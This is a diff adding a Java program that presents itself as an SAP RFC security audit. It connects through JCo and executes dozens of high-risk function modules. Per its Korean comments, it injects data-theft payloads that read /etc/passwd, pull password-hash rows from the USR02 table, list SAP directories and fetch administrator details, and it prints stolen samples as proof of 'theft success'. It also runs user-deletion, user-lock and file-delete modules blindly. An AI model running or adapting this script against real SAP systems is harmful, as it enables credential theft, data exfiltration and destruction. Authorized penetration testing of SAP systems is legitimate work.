@@ -1,0 +1,132 @@
+import com.sap.conn.jco.*;
+import java.util.Properties;
+import java.io.File;
+import java.io.FileOutputStream;
+
+public class SapStandardRfcFullAudit {
+    public static void main(String[] args) {
+        String destName = "FULL_STANDARD_AUDIT";
+        Properties props = new Properties();
+
+        // 1. 접속 정보 (현장 정보로 수정)
+        props.setProperty("jco.client.ashost", "SAP_IP");
+        props.setProperty("jco.client.sysnr",  "00");
+        props.setProperty("jco.client.client", "100");
+        props.setProperty("jco.client.user",   "USER_ID");
+        props.setProperty("jco.client.passwd", "PASSWORD");
+
+        try {
+            createDestinationFile(destName, props);
+            JCoDestination destination = JCoDestinationManager.getDestination(destName);
+            
+            System.out.println("======================================================");
+            System.out.println("   [SAP 표준 RFC 고위험군 전수 보안 진단 리포트]");
+            System.out.println("======================================================");
+
+            // [카테고리별 고위험 RFC 확장 목록]
+            String[][] auditGroups = {
+                {"[Group 1] OS Command & Remote Execution (RCE)", 
+                 "SXPG_COMMAND_EXECUTE", "SXPG_CALL_SYSTEM", "RFC_REMOTE_EXEC", "RFC_REMOTE_PIPE", 
+                 "RFC_ABAP_INSTALL_AND_RUN", "CAT_EXECUTE_CLI_COMMAND", "GUI_EXEC", "JOB_CLOSE"},
+                
+                {"[Group 2] File System Access (Information Leakage)", 
+                 "RZL_READ_FILE_LOCAL", "RZL_WRITE_FILE_LOCAL", "EPS_GET_DIRECTORY_LISTING", "EPS_FILE_DELETE", 
+                 "RS_STP_FILE_SAVE", "ARCHIV_FILE_READ_FROM_NFS", "FIEB_GET_FILE_LIST", "SUBST_GET_FILE_LIST"},
+                
+                {"[Group 3] DB & Table Direct Access (Data Theft)", 
+                 "RFC_READ_TABLE", "BBP_RFC_READ_TABLE", "DSY_READ_TABLE", "TH_DB_TABLE_INFO", 
+                 "DB_GET_TABLE_FIELDS", "RFC_GET_TABLE_ENTRIES", "VIEW_GET_DATA", "HDB_GET_TABLE_ENTRIES"},
+                
+                {"[Group 4] User, Auth & Session Control (Privilege Escalation)", 
+                 "TH_USER_LIST", "TH_DELETE_USER", "BAPI_USER_GET_DETAIL", "BAPI_USER_CHANGE", 
+                 "SUSR_RFC_USER_INTERFACE", "BAPI_USER_LOCK", "BAPI_USER_UNLOCK", "RFC_SYSTEM_INFO",
+                 "BAPI_USER_CREATE", "BAPI_USER_DELETE", "BAPI_USER_PROFILES_ASSIGN"},
+
+                {"[Group 5] Network & Communication (Lateral Movement)",
+                 "RFC_PING", "RFC_GET_LOCAL_DEST_NAMES", "RFC_TRUSTED_CHECK", "ICM_GET_INFO", "SICF_GET_INFO"}
+            };
+
+            for (String[] group : auditGroups) {
+                System.out.println("\n" + group[0]);
+                for (int i = 1; i < group.length; i++) {
+                    executeAudit(destination, group[i]);
+                }
+            }
+
+        } catch (Exception e) {
+            System.err.println("[!] 연결 실패: " + e.getMessage());
+        }
+    }
+
+    public static void executeAudit(JCoDestination dest, String rfcName) {
+        System.out.print("  ▶ " + rfcName + " : ");
+        try {
+            // 1단계: Repository에서 함수 정보 조회 (존재 여부 및 구조 파악)
+            JCoFunction function = dest.getRepository().getFunction(rfcName);
+            if (function == null) {
+                System.out.println("[안전] 서버에 존재하지 않음");
+                return;
+            }
+
+            // 2단계: 실제 데이터 탈취용 페이로드 주입
+            preparePayload(function, rfcName);
+            
+            // 3단계: 실행 (권한 체크의 핵심)
+            function.execute(dest);
+
+            // 4단계: 성공 시 증거 수집
+            System.out.println("[★★★탈취 성공★★★]");
+            printDetailedEvidence(function, rfcName);
+
+        } catch (JCoException e) {
+            handleAuditError(e);
+        }
+    }
+
+    private static void preparePayload(JCoFunction func, String rfcName) {
+        try {
+            if (rfcName.equals("RZL_READ_FILE_LOCAL")) {
+                func.getImportParameterList().setValue("NAME", "/etc/passwd");
+            } else if (rfcName.contains("READ_TABLE")) {
+                func.getImportParameterList().setValue("QUERY_TABLE", "USR02");
+                func.getImportParameterList().setValue("ROWCOUNT", 1);
+            } else if (rfcName.equals("EPS_GET_DIRECTORY_LISTING")) {
+                func.getImportParameterList().setValue("DIR_NAME", "/usr/sap");
+            } else if (rfcName.equals("BAPI_USER_GET_DETAIL")) {
+                func.getImportParameterList().setValue("USERNAME", "ADMIN");
+            }
+        } catch (Exception e) { /* 파라미터가 없는 경우 무시 */ }
+    }
+
+    private static void printDetailedEvidence(JCoFunction func, String rfcName) {
+        try {
+            if (rfcName.contains("READ_TABLE")) {
+                JCoTable data = func.getTableParameterList().getTable("DATA");
+                if (data.getNumRows() > 0) {
+                    data.setRow(0);
+                    System.out.println("     ㄴ [데이터 샘플]: " + data.getString("WA"));
+                }
+            } else if (rfcName.equals("TH_USER_LIST")) {
+                JCoTable users = func.getTableParameterList().getTable("USRLIST");
+                System.out.println("     ㄴ [데이터 샘플]: 현재 접속 중인 사용자 " + users.getNumRows() + "명 감지됨");
+            }
+        } catch (Exception e) { /* 데이터 추출 실패 시 로그 생략 */ }
+    }
+
+    private static void handleAuditError(JCoException e) {
+        if (e.getGroup() == 104) {
+            System.out.println("[!] 실행 거부 (하지만 설계도는 유출됨 - 잠재적 취약점)");
+        } else if (e.getMessage().contains("required") || e.getMessage().contains("NOT_FOUND") || e.getMessage().contains("empty")) {
+            System.out.println("[★실행 가능★] 실행 권한 확인됨 (파라미터 입력 시 데이터 즉시 유출)");
+        } else {
+            System.out.println("[기타] " + e.getMessage());
+        }
+    }
+
+    static void createDestinationFile(String name, Properties props) throws Exception {
+        File destFile = new File(name + ".jcoDestination");
+        try (FileOutputStream fos = new FileOutputStream(destFile)) {
+            props.store(fos, "Master Audit");
+        }
+    }
+}
